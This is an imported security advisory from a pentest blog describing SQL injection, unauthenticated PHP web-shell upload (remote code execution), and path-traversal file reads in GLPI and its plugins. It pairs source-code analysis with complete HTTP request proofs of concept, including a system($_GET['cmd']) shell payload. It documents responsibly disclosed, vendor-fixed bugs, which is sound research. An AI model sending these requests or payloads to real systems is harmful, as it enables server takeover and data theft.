---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-08_advisory-glpi-service-management-software-multiple-vulnerabilities-and-remote-co.md
original_filename: 2022-07-08_advisory-glpi-service-management-software-multiple-vulnerabilities-and-remote-co.md
title: Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote
  Code Execution
category: documents
detected_topics:
- command-injection
- path-traversal
- sqli
- file-upload
- otp
- csrf
tags:
- imported
- documents
- command-injection
- path-traversal
- sqli
- file-upload
- otp
- csrf
language: en
raw_sha256: c0540f41772c75e010d1cef570483b231a97daaa4b4479150e2a1def628ccbf2
text_sha256: 54f99ebce3158d8386ad3d192547568a93b2d31d23d75cfddff8514c75496fee
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-08_advisory-glpi-service-management-software-multiple-vulnerabilities-and-remote-co.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, sqli, file-upload, otp, csrf
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `c0540f41772c75e010d1cef570483b231a97daaa4b4479150e2a1def628ccbf2`
- Text SHA256: `54f99ebce3158d8386ad3d192547568a93b2d31d23d75cfddff8514c75496fee`


## Content

---
title: "Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution"
page_title: "Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution – Pentest Blog"
url: "https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/"
final_url: "https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/"
authors: ["Nuri Çilengir (@ncilengir)"]
programs: ["GLPI"]
bugs: ["SQL injection", "RCE", "LFI"]
publication_date: "2022-07-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2475
---

![](https://pentest.blog/wp-content/uploads/glpi.png)

# Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution

__[ July 8, 2022July 11, 2022](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/) __[Nuri Çilengir](https://pentest.blog/author/nuri-cilengir/) __[Research](https://pentest.blog/category/research/)

GLPI stands for Gestionnaire Libre de Parc Informatique is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing.

## Advisory Information

**Remotely Exploitable:** Yes  
**Authentication Required:** Depends on Configuration  
**Vendor URL:** glpi-project.org  
**CVSSv3.1 Score:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L)  
**Date of found:** 09.06.2022

## Technical Details

#### Vulnerability #1 – Unauthenticated**/Authenticated SQL Injection**

GLPI application contains multiple components (e.g. CMDB, Helpdesk, Project Management). The architecture is usually built on a specific structure in applications with various components. So, one of the most important things to do when source-code reviewing such applications is to analyze the application data flow and request life cycle. Therefore, I’ve spent a couple of hours understanding the whole architecture. When I had enough information about the design of the project and the way it gets interacts with agents, I started source-code reviewing.

After initial analysis, I found that the structure that acts as a kind of business layer of the application is located under the `/front` directory. Many operations in the user interface are processed by sending HTTP requests to files under the `/front` directory. Every business structure in the front directory was calling `/inc/includes.php` (Yes, PHP chaos as usual). I analyzed the includes.php file and observed that the request from the application is processed here first. The `//Security system` comment in one line of this file attracted my attention.
  
  
  //Security system
  
  if (isset($_POST)) {
  $_UPOST = $_POST; //keep raw, as a workaround
  if (isset($_POST['_glpi_simple_form'])) {
  $_POST = array_map('urldecode', $_POST);
  }
  $_POST = Sanitizer::sanitize($_POST);
  }
  if (isset($_GET)) {
  $_UGET = $_GET; //keep raw, as a workaround
  $_GET  = Sanitizer::sanitize($_GET);
  }
  if (isset($_REQUEST)) {
  $_UREQUEST = $_REQUEST; //keep raw, as a workaround
  $_REQUEST  = Sanitizer::sanitize($_REQUEST);
  }
  if (isset($_FILES)) {
  $_UFILES = $_FILES; //keep raw, as a workaround
  foreach ($_FILES as &$file) {
  $file['name'] = Sanitizer::sanitize($file['name']);
  }
  }

The data sent to the application was stored raw in a global variable and then sanitized. So, one of my starting points was to look at where the raw data was being used.

As a result of the search, I found that global variables containing raw data are used during processing user types and information assigned to tickets, problems, and changes created in the helpdesk component.
  
  
  use Glpi\Event;
  
  include('../inc/includes.php');
  
  if (empty($_GET["id"])) {
  $_GET["id"] = '';
  }
  
  Session::checkLoginUser();
  
  // as _actors virtual field stores json, bypass automatic escaping
  if (isset($_UPOST['_actors'])) {
  $_POST['_actors'] = json_decode($_UPOST['_actors'], true);
  $_REQUEST['_actors'] = $_POST['_actors'];
  }
  
  $change = new Change();
  if (isset($_POST["add"])) {
  $change->check(-1, CREATE, $_POST);
  
  $newID = $change->add($_POST);
  Event::log(
  $newID,
  "change",
  4,
  "maintain",
  //TRANS: %1$s is the user login, %2$s is the name of the item
  sprintf(__('%1$s adds the item %2$s'), $_SESSION["glpiname"], $_POST["name"])
  );
  if ($_SESSION['glpibackcreated']) {
  Html::redirect($change->getLinkURL());
  } else {
  Html::back();
  }
  }

In the `/front/change.form.php` file at lines between 12-15, the `_actors` variable is assigned to the `$_UPOST` global variable, and it is seen that it is processed without escaping.

GLPI keeps the types of files that could be uploaded to the system in the database, and now we can add a record to this table. On the other hand, the helpdesk module has a file upload feature. So?

**Note:** Unauthenticated users can access the helpdesk depending on the settings in the application.
  
  
  POST /front/change.form.php HTTP/1.1
  Host: acme.com
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Content-Type: multipart/form-data; boundary=---------------------------190705055020145329172298897156
  Content-Length: 4836
  Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82_rememberme=%5B2%2C%22wSQx0155YofQ
  n53WMozDGuSI1p2KAzxZ392stmrX%22%5D; glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=f3cciacap6rqs2bcoaio5lmikg
  
  -----------------------------190705055020145329172298897156
  Content-Disposition: form-data; name="id"
  0
  -----------------------------190705055020145329172298897156
  Content-Disposition: form-data; name="_glpi_csrf_token"
  752d2ff606bf360d809b682f***REDACTED-SUSPECT-TOKEN***  -----------------------------190705055020145329172298897156
  Content-Disposition: form-data; name="_actors"
  {"requester":[],"observer":[],"assign":[{"itemtype":"User","items_id":"2','2',); INSERT INTO `glpi_documenttypes` (`name`, `ext`, `icon`, `mime`, `is_uploadable`) VALUES('PHP', 'php', 'jpg-dist.png', 'application/x-php', 1); ---'","use_notification":"1","alternative_email":""}]}
  
  -----------------------------190705055020145329172298897156--

If you manipulate the filename uploaded to the system, the file is placed under `/files/_tmp/`. HTTP GET request required to trigger the issue is as follows.
  
  
  POST /ajax/fileupload.php HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  X-Glpi-Csrf-Token: bb1c7f6cd4c1865838b234b4***REDACTED-SUSPECT-TOKEN***  X-Requested-With: XMLHttpRequest
  Content-Type: multipart/form-data; boundary=---------------------------102822935214007887302871396841
  Content-Length: 559
  Origin: http://acme.com
  Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82_rememberme=%5B2%2C%22wSQx0155YofQn53WMozDGuSI1p2KAzxZ392stmrX%22%5D; glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=f3cciacap6rqs2bcoaio5lmikg
  
  -----------------------------102822935214007887302871396841
  Content-Disposition: form-data; name="name"
  
  _uploader_filename
  -----------------------------102822935214007887302871396841
  Content-Disposition: form-data; name="showfilesize"
  
  1
  -----------------------------102822935214007887302871396841
  Content-Disposition: form-data; name="_uploader_filename[]"; filename="a.php"
  Content-Type: application/x-php
  
  Output: 
  <?php echo system($_GET['cmd']); ?>
  -----------------------------102822935214007887302871396841--

**PoC URL:**
  
  
  http://192.168.56.113/files/_tmp/poc.php?cmd=

#### **Vulnerability #2 – Unauthenticated Remote Code Execution** on Cartography Plugin

GLPI performs operations on many devices and operating systems and processes the data obtained through these systems. That’s why there are many plugins in GLPI. So, I started researching a few plugins available on the marketplace, thinking it would be right also to research useful plugins in these applications.

After listing the plugins according to the number of downloads, I started working on a few plugins. I have seen that PHP files that perform file reading operations are in the form of filename.send.php in plugin directories. On the other hand, file upload operations were called upload.php. That’s why I started source code reviews from these files.
  
  
  // Look for the content type header
  if (isset($_SERVER["HTTP_CONTENT_TYPE"])) {
  $contentType = $_SERVER["HTTP_CONTENT_TYPE"];
  }
  
  if (isset($_SERVER["CONTENT_TYPE"])) {
  $contentType = $_SERVER["CONTENT_TYPE"];
  }
  
  // Handle non multipart uploads older WebKit versions didn't support multipart in HTML5
  if (strpos($contentType, "multipart") !== false) {
  if (isset($_FILES['file']['tmp_name']) && is_uploaded_file(stripslashes($_FILES['file']['tmp_name']))) {
  ....
  } else {
  die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}, "id" : "id"}');
  }
  } else {
  // Open temp file
  $out = fopen($targetDir . DIRECTORY_SEPARATOR . $fileName, $chunk == 0 ? "wb" : "ab");
  if ($out) {
  // Read binary input stream and append it to temp file
  $in = fopen("php://input", "rb");
  
  if ($in) {
  while ($buff = fread($in, 4096)) {
  fwrite($out, $buff);
  }
  } else {
  die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}');
  }
  
  fclose($in);
  fclose($out);
  } else {
  die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}');
  }
  }

Lines between 11 and 18-36, if the `Content-Type` header doesn’t contain the definition of multipart in the `/front/upload.php` file, the name parameter is used as the filename, and the request’s body is used as the file content. Here is the necessary HTTP request to trigger this issue.
  
  
  POST /marketplace/positions/front/upload.php?name=poc.php HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Length: 39
  Origin: http://192.168.56.113
  Connection: close
  
  <?php echo system($_GET["cmd"]); ?>

#### **Vulnerability #3 – Unauthenticated Local File Inclusion** Glpiinventory Plugin

GLPI stores and processes the data it collects from agents in inventories. Although there is an embedded inventory module in the product installation, other inventory plugins are available on the marketplace, according to agent types.

The `getFilePart` case in the file `/b/deploy/index.php`, which performs the action according to the action variable, which is the HTTP GET parameter, calls the `CLASS::httpSendFile($file)` function on line 8.
  
  
  switch (filter_input(INPUT_GET, "action")) {
  case 'getJobs':
  ...
  break;
  
  case 'getFilePart':
  $DB->close();
  PluginGlpiinventoryDeployFilepart::httpSendFile(filter_input(INPUT_GET, "file"));
  exit;
  break;
  ...

In line 8 of the `httpSendFile` function in` /inc/deployfilepart.class.php`, it can be seen that the `$file` parameter bypass after some filtering like `/./../..[path]`. In line 13, the filtered filename is combined with the default path. In line 40, it can be called if the available filter is bypassed and the file exists.
  
  
  public static function httpSendFile($file)
  {
  if (empty($file)) {
  header("HTTP/1.1 500");
  exit;
  }
  $matches = [];
  preg_match('/.\/..\/([^\/]+)/', $file, $matches);
  $sha512 = $matches[1];
  //  $short_sha512 = substr($sha512, 0, 6);
  
  $repoPath = GLPI_PLUGIN_DOC_DIR . "/glpiinventory/files/repository/";
  
  $pfDeployFile = new PluginGlpiinventoryDeployFile();
  $filePath  = $repoPath . $pfDeployFile->getDirBySha512($sha512) . '/' . $sha512;
  
  if (!is_file($filePath)) {
  header("HTTP/1.1 404");
  print "\n" . $filePath . "\n\n";
  exit;
  } elseif (!is_readable($filePath)) {
  header("HTTP/1.1 403");
  exit;
  }
  
  error_reporting(0);
  
  header('Content-Description: File Transfer');
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename=' . $sha512);
  header('Content-Transfer-Encoding: binary');
  header('Expires: 0');
  header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
  header('Pragma: public');
  header('Content-Length: ' . filesize($filePath));
  if (ob_get_level() > 0) {
  ob_clean();
  }
  flush();
  readfile($filePath);
  exit;
  }

HTTP GET request necessary to trigger the issue is as follows.
  
  
  POST /marketplace/glpiinventory/b/deploy/index.php?action=getFilePart&file=../../\\..\\..\\..\\..\\System32\\drivers\\etc\\hosts&version=1 HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Upgrade-Insecure-Requests: 1

**Vulnerability #4 – Unauthenticated Local File Inclusion Manageentities and Activity Plugins**

The file query parameter sent to the `/front/cri.send.php` file consists of 3 parts. If the `seefile` variable exists in the query parameter, the plugin will redirect to the vulnerable code block between lines 9 and 22.
  
  
  if (isset($_GET["file"])) { 
  $splitter = explode("/", $_GET["file"]);
  
  if (count($splitter) == 3) {
  
  if (file_exists(GLPI_DOC_DIR . "/" . $_GET["file"])) {
  if (!isset($_GET["seefile"])) {
  Toolbox::sendFile(GLPI_DOC_DIR . "/" . $_GET["file"], $splitter[2]);
  } else {
  $doc  = new Document();
  $doc->fields['filepath'] = $_GET["file"];
  $doc->fields['mime']  = 'application/pdf';
  $doc->fields['filename'] = $splitter[2];
  
  //Document send method that has changed.
  //Because of : document.class.php
  //if (!in_array($extension, array('jpg', 'png', 'gif', 'bmp'))) {
  //  $attachment = " attachment;";
  //}
  $cri = new PluginManageentitiesCri();
  $cri->send($doc);
  }
  } else {
  Html::displayErrorAndDie(__('Unauthorized access to this file'), true);
  }
  } else {
  Html::displayErrorAndDie(__('Invalid filename'), true);
  }
  }

As seen in line 3, the file name is combined with the document directory.
  
  
  function send($doc) {
  
  $file = GLPI_DOC_DIR . "/" . $doc->fields['filepath'];
  
  if (!file_exists($file)) {
  die("Error file " . $file . " does not exist");
  }
  // Now send the file with header() magic
  header("Expires: Mon, 26 Nov 1962 00:00:00 GMT");
  header('Pragma: private'); /// IE BUG + SSL
  header('Cache-control: private, must-revalidate'); /// IE BUG + SSL
  header("Content-disposition: filename=\"" . $doc->fields['filename'] . "\"");
  header("Content-type: " . $doc->fields['mime']);
  
  readfile($file) or die ("Error opening file $file");
  }

HTTP GET request necessary to trigger the issue is as follows.
  
  
  GET /marketplace/manageentities/inc/cri.class.php?&file=../../\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts&seefile=1 HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Upgrade-Insecure-Requests: 1

The same vulnerability exists in another activity plugin, but it requires authentication. Activity Plugin uses the same functions and code blocks in different classes (`/activity/front/cra.send.php`), and the HTTP GET request necessary to trigger the issue is as follows
  
  
  GET /marketplace/activity/front/cra.send.php?&file=../../\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts&seefile=1 HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close

**Vulnerability #5 – Authenticated Limited Local File Read on CMDB Plugin (BONUS 1 !)**

If the file variable with the query parameter exists in the authenticated requests sent to the `/front/icon.send.php` file, it will be executed between lines 16 and 21. GLPI_DOC_DIR is defined as the `/files` folder. Logs, plugins, and other files are under the called `/files` folder.
  
  
  if (isset($_GET['idDoc'])) { // docid for document
  if (!$doc->getFromDB($_GET['idDoc'])) {
  Html::displayErrorAndDie(__('Unknown file'), true);
  }
  
  if (!file_exists(GLPI_DOC_DIR . "/" . $doc->fields['filepath'])) {
  Html::displayErrorAndDie(__('File not found'), true); // Not found
  }
  if ($doc->fields['sha1sum'] && $doc->fields['sha1sum'] != sha1_file(GLPI_DOC_DIR . "/" . $doc->fields['filepath'])) {
  Html::displayErrorAndDie(__('File is altered (bad checksum)'), true); // Doc alterated
  } else {
  $doc->send();
  }
  
  } else if (isset($_GET["file"])) { // for other file
  $splitter = explode("/", $_GET["file"]);
  if (count($splitter) == 2) {
  if (file_exists(GLPI_DOC_DIR . "/" . $_GET["file"])) {
  Toolbox::sendFile(GLPI_DOC_DIR . "/" . $_GET["file"], $splitter[1]);
  } else {
  Html::displayErrorAndDie(__('Unauthorized access to this file'), true);
  }
  } else {
  Html::displayErrorAndDie(__('Invalid filename'), true);
  }
  }

HTTP GET request necessary to trigger the issue is as follows.
  
  
  GET /marketplace/cmdb/front/icon.send.php?file=_log/sql-errors.log HTTP/1.1
  Host: 192.168.56.113
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close

## Timeline

09 Jun 2022 16:47 GMT+3 – Vulnerability detected.

11 Jun 2022 02:50 GMT+3 – Report to the GLPI team.

15 Jun 2022 16:17 GMT+3 – GLPI fixed the vulnerability.

11 Jul 2022 – Public PoC release.

[0day](https://pentest.blog/tag/0day/) [advisory](https://pentest.blog/tag/advisory/) [research](https://pentest.blog/tag/research/)

![](https://secure.gravatar.com/avatar/59beb7b08851e4c22f88fe6903402a4c01063bcb23246029185c36392d887c8a?s=60&d=monsterid&r=g)

#### [Nuri Çilengir](https://pentest.blog/author/nuri-cilengir/)

Pentest Ninja at @prodaft
